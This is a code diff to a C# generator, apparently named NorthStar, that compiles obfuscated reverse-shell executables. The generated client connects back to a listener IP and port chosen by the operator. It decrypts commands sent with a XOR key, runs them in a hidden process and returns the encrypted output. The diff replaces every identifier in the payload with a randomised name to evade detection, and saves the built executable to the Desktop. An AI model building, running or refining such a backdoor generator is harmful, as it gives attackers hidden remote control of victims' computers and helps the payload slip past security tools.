@@ -26,6 +26,7 @@ namespace NorthStar
         private static string socketDeadVarName;
         private static string commandVar;
         private static string recVar;
+        private static string bufVar;
         private static string isLastVar;
         private static string isFirstVar;
         private static string lasteVar;
@@ -33,6 +34,16 @@ namespace NorthStar
         private static string sckVar;
         private static string sckFuncVar;
         private static string connectAddressVar;
+        private static string obfunc;
+        private static string msgbld;
+        private static string emsgbld;
+        private static string kstr;
+        private static string ckl;
+        private static string obfparam1;
+        private static string obfparam2;
+        private static string obfinfparam;
+        private static string obfinfvar;
+
         private static Random random = new Random((int)DateTime.Now.Ticks);
 
 
@@ -80,6 +91,16 @@ namespace NorthStar
             sckFuncVar = varGenerate(true);
             connectAddressVar = varGenerate(true);
             isLastVar = varGenerate(true);
+            bufVar = varGenerate(true);
+            obfunc = varGenerate(true);
+            msgbld = varGenerate(true);
+            emsgbld = varGenerate(true);
+            kstr = varGenerate(true);
+            ckl = varGenerate(true);
+            obfparam1 = varGenerate(true);
+            obfparam2 = varGenerate(true);
+            obfinfparam = varGenerate(true);
+            obfinfvar = varGenerate(true);
         }
 
 
@@ -101,27 +122,27 @@ namespace Client
         [DllImport(""user32.dll"")]
         private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);static Socket " + sckVar + @" = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);public static bool " + socketDeadVarName + @" = false;public static bool " + isFirstVar + @" = true;
         
- private static string encryptDecrypt(string message, string key)
+ private static string " + obfunc + @"(string " + obfparam1 + @", string " + obfparam2 + @")
         {
-            StringBuilder messageStringBuild = new StringBuilder(message);
-            StringBuilder keyString = new StringBuilder(key);
-            int keyLenghtCount = 0;
-            StringBuilder encryptedStringBuild = new StringBuilder(message.Length);
+            StringBuilder " + msgbld + @" = new StringBuilder(" + obfparam1 + @");
+            StringBuilder " + kstr + @" = new StringBuilder(" + obfparam2 + @");
+            int " + ckl + @" = 0;
+            StringBuilder " + emsgbld + @" = new StringBuilder(" + obfparam1 + @".Length);
 
-            char Textch;
-            for (int iCount = 0; iCount < message.Length; iCount++)
+            char " + obfinfvar + @";
+            for (int " + obfinfparam + @" = 0; " + obfinfparam + @" < " + obfparam1 + @".Length; " + obfinfparam + @"++)
             {
-                Textch = messageStringBuild[iCount];
+                " + obfinfvar + @" = " + msgbld + @"[" + obfinfparam + @"];
 
-                Textch = (char)(Textch ^ keyString[keyLenghtCount]);
-                encryptedStringBuild.Append(Textch);
-                if (keyLenghtCount >= (key.Length - 1))
+                " + obfinfvar + @" = (char)(" + obfinfvar + @" ^ " + kstr + @"[" + ckl + @"]);
+                " + emsgbld + @".Append(" + obfinfvar + @");
+                if (" + ckl + @" >= (" + obfparam2 + @".Length - 1))
                 {
-                    keyLenghtCount = 0;
+                    " + ckl + @" = 0;
                 }
 
             }
-            return encryptedStringBuild.ToString();
+            return " + emsgbld + @".ToString();
         }
 
         static void " + sckFuncVar + @"(){  if (!" + socketDeadVarName + @")" + socketDeadVarName + @" = false;IPEndPoint "+ connectAddressVar + @" = new IPEndPoint(IPAddress.Parse(""" +  textBoxListenerIp.Text + "\"" + ")," + " " + textBoxListenerPort.Text + ");";  // Server IP & PORT 
@@ -134,7 +155,7 @@ if (" + isFirstVar + @")
                 string " + isLastVar + @" = """ + textBoxInKey.Text + "\";";
 
             string payload_3 = @"
-                " + isLastVar + @" = encryptDecrypt("+ isLastVar + @",""" + textBoxEncrypt.Text + @""");
+                " + isLastVar + @" = " + obfunc + @"("+ isLastVar + @",""" + textBoxEncrypt.Text + @""");
 
                 byte[] " + lasteVar + @" = Encoding.Default.GetBytes(" + isLastVar + @");
                 " + sckVar + @".Send(" + lasteVar + @", 0, " + lasteVar + @".Length, 0);
@@ -146,12 +167,12 @@ if (" + isFirstVar + @")
             {
                 if (!" + sckVar + @".Connected)
                     return false;
-                byte[] buffer = new byte[255]; 
-                int rec = " + sckVar + @".Receive(buffer, 0, buffer.Length, 0); // receving
+                byte[] " + bufVar + @" = new byte[255]; 
+                int rec = " + sckVar + @".Receive(" + bufVar + @", 0, " + bufVar + @".Length, 0); // receving
 
-                Array.Resize(ref buffer, rec);
-                string " + commandVar + @" = Encoding.Default.GetString(buffer); 
- " +commandVar + @" = encryptDecrypt(" + commandVar + @",""" + textBoxEncrypt.Text + @""");
+                Array.Resize(ref " + bufVar + @", rec);
+                string " + commandVar + @" = Encoding.Default.GetString(" + bufVar + @"); 
+ " +commandVar + @" = " + obfunc + @"(" + commandVar + @",""" + textBoxEncrypt.Text + @""");
 
                     Process p = new Process();
                     p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
@@ -165,7 +186,7 @@ if (" + isFirstVar + @")
                     string output = p.StandardOutput.ReadToEnd();
                     string error = p.StandardError.ReadToEnd();
                     string " + isLastVar + @" = output + ""\n"" + error;
-" + isLastVar + @" = encryptDecrypt(" + isLastVar + @",""" + textBoxEncrypt.Text + @""");
+" + isLastVar + @" = " + obfunc + @"(" + isLastVar + @",""" + textBoxEncrypt.Text + @""");
                     byte[] " + lasteVar + @" = Encoding.Default.GetBytes(" + isLastVar + @");
                     " + sckVar + @".Send(" + lasteVar + @", 0, " + lasteVar + @".Length, 0);
                 
@@ -322,13 +343,16 @@ if (" + isFirstVar + @")
                 CSharpCodeProvider codeProvider = new CSharpCodeProvider();
                 ICodeCompiler icc = codeProvider.CreateCompiler();
 
-               
+
+
+                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
                 System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
                 string payload = regeneratePayload();
                 parameters.GenerateInMemory = true;
                 parameters.ReferencedAssemblies.Add("System.dll");
                 parameters.GenerateExecutable = true;
-                parameters.OutputAssembly = textBoxExeName.Text;
+                parameters.OutputAssembly = path + "\\" + textBoxExeName.Text + ".exe";
                 CompilerResults results = icc.CompileAssemblyFromSource(parameters, payload);
                 if (results.Errors.Count < 1)
                 {
